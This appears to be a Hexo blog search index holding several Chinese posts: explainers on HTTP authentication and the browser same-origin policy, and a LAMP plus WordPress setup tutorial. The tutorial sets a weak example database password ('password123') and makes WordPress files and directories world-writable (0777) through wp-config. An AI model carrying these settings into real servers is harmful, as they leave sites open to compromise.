    <content type="text"><![CDATA[HTTP是一种没有状态的协议，它并不知道是谁访问了应用。所以服务器必须记录用户的状态，进行认证、授权，进而控制用户操作。 随着技术的发展出现了很多认证授权机制。目前，比较成熟完善的是Cookie/Session机制。近几年，由于JWT机制更好得释放了服务端的资源，也变得火热起来。不过，还不够成熟容易出现很多问题。 所以，在更高效、更安全的方案出现前，Cookie/Session机制可能仍然是将来Web认证授权的中流砥柱。 一、HTTP Basic Auth HTTP Basic Auth是最原始的认证方式。现在已经被淘汰。 （一）原理 每次请求API时都提供用户的username和password （二）优点 配合RESTful API 使用的最简单的认证方式，只需提供用户名密码即可 （三）缺点 有暴露用户名和密码给第三方客户端的风险。 二、Cookie/Session Cookie/Session Auth是通用解决HTTP无状态进行认证授权的机制。通常把Session机制理解为会话（即：有状态）。 很多人区分不开Cookie与Session。下面加粗部分及结合原理部分可以仔细揣摩进行区分。谁在客户端？谁在服务端？谁携带SeesionID？两者之间什么关系？ （一）Cookie Cookie 属于一种内建于浏览器中实现状态的方式。 Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，以达到认证的目的。也是实现Session跟踪的一种方式。 Cookie另一用途：登录过一个网站，下次登录不想再输入账号怎么办？这个信息可以写到Cookie里面。访问网站的时候网站页面的脚本可以读取这个信息，自动把用户名填上。这也是Cookie的由来（Cookie英文意思是饼干，给用户的一点甜头。） （二）Session Session是在服务端保存的一个数据结构。用来跟综标识用户的状态。 三、Cookie/Session机制原理 每次HTTP请求时，客户端都会发送相应携带SeesionID的Cookie信息到服务端。进而，实现了有状态 用户在浏览器登陆之后（正确的密码，第一层认证通过），服务端为用户生成唯一的 Session ID，存储在服务端的存储服务（例如 MySql, Redis）中 该 Session ID也同时返回给浏览器，以 SESSION_ID 为 KEY 存储在浏览器的 Cookie 中 如果用户再次访问该网站，Cookie 里的 SESSION_ID 会随着请求一同发往服务端 服务端通过判断 SESSION_ID 是否已经在 Redis 中判断用户是否处于登陆状态 四、Cookie/Session应用 几乎动态网站都有用应用。 比如：淘宝买东西，下单后由于HTTP无状态所以并不知道哪个用户所操作的。所以服务器要为特定的用户创建特定的Session用于标识这个用户，并且跟踪用户。 五、Cookie/Session机制特点 数据需要客户端和服务器同时存储。（故，消耗了服务器资源） 用户进行操作时，需要带上cookie，在服务器进行验证（可能存在Cookie劫持、盗取） 有状态 六、Cookie/Session机制缺点（一）扩展性不好 如果服务器集群（或者跨域的服务导向架构）要求Session数据共享，每台服务器都能够读取Session 例如：A 网站和 B 网站是同一家公司的关联服务。现在要求，用户只要在其中一个网站登录，再访问另一个网站就会自动登录，怎么实现？ 一种解决方案是 session 数据持久化，写入数据库或别的持久层。各种服务收到请求后，都向持久层请求数据。这种方案的优点是架构清晰，缺点是工程量比较大。另外，持久层万一挂了，就会单点失败。 另一种方案是服务器索性不保存 session 数据了，所有数据都保存在客户端，每次请求都发回服务器。JWT 就是这种方案的一个代表。 （二）希望无状态的API时-不推荐使用 在构建 API 时，开发者会发现认证方式和网页应用有一些不同，除了像 ajax 这种典型的 web 技术外，如果希望 API 是无状态的，不推荐使用 Cookie。]]></content>
      <categories>
        <category>WEB安全</category>
        <category>Browser端安全</category>
      </categories>
      <tags>
        <tag>认证授权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web安全—CSP策略]]></title>
    <url>%2F2018%2F07%2F02%2FWeb%E5%AE%89%E5%85%A82%E2%80%94CSP%E7%AD%96%E7%95%A5%2F</url>
    <content type="text"></content>
      <categories>
        <category>WEB安全</category>
        <category>Browser端安全</category>
      </categories>
      <tags>
        <tag>CSP策略</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web安全—SOP策略]]></title>
    <url>%2F2018%2F07%2F01%2FWeb%E5%AE%89%E5%85%A81%E2%80%94SOP%E7%AD%96%E7%95%A5%2F</url>
    <content type="text"><![CDATA[一、同源策略 同源策略是一种约定，是浏览器最核心也最基本的安全功能，主要体现在同源策略会限制来自不同源的文档和脚本对当前源的文档数据的读取或设置某些属性，是用于隔离潜在恶意文件的重要安全机制。 同源策略是Netscape提出的一个著名的安全策略，现在所有的可支持javascript的浏览器都会使用这个策略； web构建在同源策略基础之上，浏览器对非同源脚本的限制措施是对同源策略的具体实现。 含义一（DOM层面的同源策略） 限制了来自不同源的”document”对象或js脚本，对当前“document”对象的读取或设置某些属性； 含义二（Cookie和XMLHttprequest层面的同源策略） 只有和本网页同源的脚本才会被执行，有时，AJAX已经加载不同源的脚本，但绝对不会被执行； 含义三（同源策略的非绝对性） 同源策略通常允许进行跨域写操作、通常允许跨域资源嵌入、通常不允许跨域读操作； &lt;script&gt;&lt;img&gt;&lt;iframe&gt;&lt;link&gt;&lt;video&gt;&lt;audio&gt;等带有src属性的标签可以从不同的域加载和执行资源，同源策略关注的是加载js的页面所在的域，而不是页面内存放的js文件的域； 含义四（其他插件的同源策略） flash、java applet、silverlight、googlegears等浏览器加载的第三方插件也有各自的同源策略，只是这些同源策略不属于浏览器原生的同源策略，如果有漏洞则可能被黑客利用，从而留下XSS攻击的后患； 二、同源的定义 如果两个页面的协议、端口（如果有指定）和主机都相同，则两个页面具有相同的源。 可以称为： 1tuple：协议、域名、端口 //或者简单地叫做"tuple"，即元（“元”，是指一些事物组合在一起形成一个整体，比如（1，2）叫二元，（1，2，3）叫三元） 下面给出相对http://abc.jjp.com/app/page.html的同源检测结果： url 结果 原因 http://abc.jjp.com/app/page2.html 成功 http://abc.jjp.com/source/page2.html 成功 https://abc.jjp.com/app/dist/page3.html 失败 协议不相同 http://efg.jjp.com/app/page2.html 失败 域名不相同 http://abc.jjp.com:8080/app/page2.html 失败 端口不相同 三、源的继承 about:blank，javascript:中的内容，继承了将其载入的文档的源 因为这些伪协议的URL并没有明确地包含有关服务器的源的信息。 当调用window.open()打开一个about:blank页面时 若该页面有代码，则会继承创建该页面的代码的源。 而data:URLs则会重新得到一个新的空的安全的上下文，不会继承源 12注意：在Gecko 6.0之前，如果用户在位置栏中输入 data URLs，data URLs 将继承当前浏览器窗口中网页的安全上下文。 data：URLs 获得一个新的，空的安全上下文。 四、IE列外 在同源策略中，Internet Explorer有两点不同：（这些例外是非标准的，其它浏览器也未做出支持，但会助于开发基于window RT IE的应用程序） 1.授信范围（Trust Zones）：两个相互之间高度互信的域名，如公司域名（corporate domains），不遵守同源策略的限制。 2.端口：IE 未将端口号加入到同源策略的组成部分之中，因此： 1234http://company.com:81/index.html 和 http://company.com/index.html 属于同源并且不受任何限制。 五、源的更改 页面可以改变本身的源，但是会有一些限制。脚本可以将 document.domain设置为当前域或者当前域的超级域，该较短的域会用于后续源检查。 假如当前页面http://abc.jjp.com/index.html文档中执行如下脚本，将当前域设置当前域的超级域 1document.domain = 'jjp.com' 设置完之后，该页面会通过http://jjp.com/page.html的同源检查，同时abc.jjp.com不能设置为efg.jjp.com，因为efg.jjp.com不是abc.jjp.com的超级域 如果存在端口号不一致，想通过document.domain设置的方式来通过同源检查的话需要双方都进行设置。 因为设置document.domain会导致端口号被重写为null。 如果jjp.com:8080想要与jjp.com通信，把jjp.com:8080页面的document.domain设置为jjp.com时端口号会被重写为null 而原来的jjp.com的端口号为80，则还是不能够通过同源检测，需要双方同时设置document.domain让双方端口号都为null。 12注意：document.domain能够让子域访问其父域，但是需要同时将子域和父域的document.domain设置为相同的值。这是必要的，即使是简单的将父域设置为其原来的值。不这么做的话可能导致权限错误 六、不同源之间的交互 同源策略控制了不同源的交互，主要有三类交互： 跨域写： 通常允许 比如链接、重定向和表单提交(因为表单提交不需要反馈数据) 跨域资源嵌入： 通常允许，下面会给出跨域资源嵌入的例子 跨域读： 通常不允许 比如在使用XMLHttpRequest的时候会发生跨域问题，不过通过某些方法仍可以进行跨域读 以下是可能嵌入跨源的资源的一些示例： 1234567&lt;script src="..."&gt;&lt;/script&gt; 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。&lt;link rel="stylesheet" href="..."&gt; 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的Content-Type 消息头。不同浏览器有不同的限制： IE, Firefox, Chrome, Safari (跳至CVE-2010-0051)部分 和 Opera。&lt;img&gt;嵌入图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,...&lt;video&gt; 和 &lt;audio&gt;嵌入多媒体资源。&lt;object&gt;, &lt;embed&gt; 和 &lt;applet&gt; 的插件。@font-face 引入的字体。一些浏览器允许跨域字体（ cross-origin fonts），一些需要同源字体（same-origin fonts）。&lt;frame&gt; 和 &lt;iframe&gt; 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的Content-Type 消息头。不同浏览器有不同的限制： IE, Firefox, Chrome, Safari (跳至CVE-2010-0051)部分 和 Opera。 嵌入图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,... 和 嵌入多媒体资源。 , 和 的插件。 @font-face 引入的字体。一些浏览器允许跨域字体（ cross-origin fonts），一些需要同源字体（same-origin fonts）。 和 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。 七、如何阻止跨源访问 避免跨域写：在发起写请求中携带一个隐藏的token，然后服务器端对这个token进行验证，多用来防范CSRF攻击 避免跨域读：要保证返回给客户端的资源是不可嵌入的，不可以是上面列出的允许跨域资源嵌入的标签 避免跨域资源嵌入：需要确保html文档中没有上面列出的允许跨域资源嵌入的标签 八、跨源脚本API访问 javascript的api中，允许文档间互相引用，如iframe.contentWindow，window.parent， window.open和window.opener，这些api可以拿到其他文档的对象的引用，但是当两个文档不同源时，对该对象(如Window、Location)的访问就会有所限制。如果想要两个不同源的窗口进一步交流可以使用window.postMessage。 九、跨源数据存储访问 localStorage、IndexedDB等数据存储会以源进行分割，每个源拥有自己独立的存储空间，一个源的js脚本不能对属于其他源的数据进行读写操作 cookies同样只有同源网页才能共享，设置其domain、path、secure、HttpOnly属性可以来限定其访问性 属性 作用 domain 指定cookies对哪个域有效，cookies只会发向该域，默认值是设置cookie的那个域 path 表示相对于domain的路径，只有在该路径下才能拿到cookies，默认值为/ secure 设置了该属性或者设置了’secure=true’表示只能在 HTTPS 连接中传递cookies HttpOnly 设置了该属性或这设置了’HttpOnly=true’表示js脚本不能读取到cookie信息 十、实现跨域读取的方案 XMLHttpRequest JSONP CORS WebSocket 代理 Cookie的跨域 跨窗口的跨域通信 片段识别符 window.name window.postMessage 跨源数据存储]]></content>
      <categories>
        <category>WEB安全</category>
        <category>Browser端安全</category>
      </categories>
      <tags>
        <tag>SOP策略</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建LAMP博客]]></title>
    <url>%2F2018%2F07%2F01%2F%E6%90%AD%E5%BB%BALAMP%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[搭个人网站一般有两种选择： GitHub Pages + Hexo / jekyl 服务器 + WordPress / Typecho 我选择LAMP+阿里云+Wordpress。穷啊，阿里云学生有1折优惠，十块钱一个月。可以接受。 所谓LAMP，即：Linux+Apache+Mysql+Php 下面结合他人总结与自己实际遇到的问题，给大家介绍如何搭建自己的博客： 一、服务器选择 Ubuntu 16.04二、购买ECS服务器后，可以同时做的事有： 购买域名，暂时还没买。原因：没钱！！！ 下载 Xshell5（远程PowerShell），Xftp5（ftp传文件）。 看看喜欢什么WordPress插件。 三、使用 Xshell5 连接 ECS：连接前先在把自己的服务器添加安全组，SHH协议默认连接22端口。添加具体方法大家可以百度谷歌。 四、Ubuntu LAMP环境搭建1.系统升级和更新源 1sudo apt-get update sudo apt-get upgrade 2.配置apache2 1apt-get install apache2 -y 在本地计算机（您自己使用的电脑打开浏览器）输入http://&lt;云主机 IP 地址&gt; 查看到 “it works” 界面，说明 apache2 安装成功。（必须打开apache默认端口：80。当然也可以在config文件里面修改，然后在安全组里面加上。） 3.安装php组件 apt-get 里有 php7.2，所以我们可以直接安装 php7.2。 1sudo apt-get install php7.2 -y 安装 php 相关组件： 1sudo apt-get install libapache2-mod-php7.2 4.安装mysql数据库 1sudo apt-get install mysql-server -y 安装php mysql相关组件： 1sudo apt-get install php7.2-mysql 5.安装phpmyadmin 使用 apt-get 安装 phpmyadmin，安装过程中，需要根据提示选择 apache2 ，再输入root密码 和数据库密码： 1sudo apt-get install phpmyadmin -y 6.建立 /var/www/html 下的软连接： (使得mysql和phpmyadmin文件链接起来使得在www文件加下的文件可以直接被访问) 1sudo ln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin 7.重启mysql 和apache2 1sudo service mysql restart sudo systemctl restart apache2.service 二、下载并安装wordpress 1.下载wordpress 12wget https://cn.wordpress.org/wordpress-4.7.4-zh_CN.zip（目前最新版本为：https://cn.wordpress.org/wordpress-4.9.4-zh_CN.zip） 2.安装解压工具 1sudo apt-get install zip 3.解压wordpress安装包 1sudo unzip wordpress-4.9.4-zh_CN.zip 4.为 wordpress 配置一个数据库 进入 mysql，输入以下代码后，按提示输入您MySQL密码: 1mysql -u root -p 5.为 wordpress 创建一个叫 wordpress 的数据库 1CREATE DATABASE wordpress; 6.为 这个数据库设置一个用户为 wordpressuser： 1CREATE USER wordpressuser; 7.为这个用户配置一个密码为 password123： 1SET PASSWORD FOR wordpressuser= PASSWORD(&quot;password123&quot;); 8.为这个用户配置数据库的访问权限： 1GRANT ALL PRIVILEGES ON wordpress.* TO wordpressuser IDENTIFIED BY&quot;password123&quot;; 9.生效这些配置 1FLUSH PRIVILEGES; 10.然后退出 1mysql exit; 容易掉坑： 数据库，错误千差万别，还是多谷狗百度，一般要修改文件，不熟悉Linux指令可善用Xftp :) 检查开放端口，注意LAMP与LNMP端口有少许不同，在ECS控制台添加（80,8080端口） 选用相同密码可行，只是会报Warning 五、登陆wordpress后台解决wordpress安装主题或插件需要ftp： 在Xftp中返回网站根目录，找到wp-config.php这个PHP文件， 用VScode，Notepad++等编辑器打开（不要用记事本），在wp-config.php中添加下列4行代码: 1234define('WP_TEMP_DIR', ABSPATH.'wp-content/tmp');/* WordPress的临时目录。*/define("FS_METHOD", "direct");define("FS_CHMOD_DIR", 0777);define("FS_CHMOD_FILE", 0777); Tips：要在定义ABSPATH的后面，即在以下代码的后面添加 12if ( !defined('ABSPATH') )define('ABSPATH', dirname(__FILE__) . '/'); 六、参考连接https://www.jianshu.com/p/84c2dad49e42]]></content>
      <categories>
        <category>软件程序</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello，Security！]]></title>
    <url>%2F2018%2F07%2F01%2FHello%EF%BC%8CSecurity%EF%BC%81%2F</url>
    <content type="text"><![CDATA[记录分享我的信息安全之旅。]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>心得分享</tag>
      </tags>
  </entry>
</search>
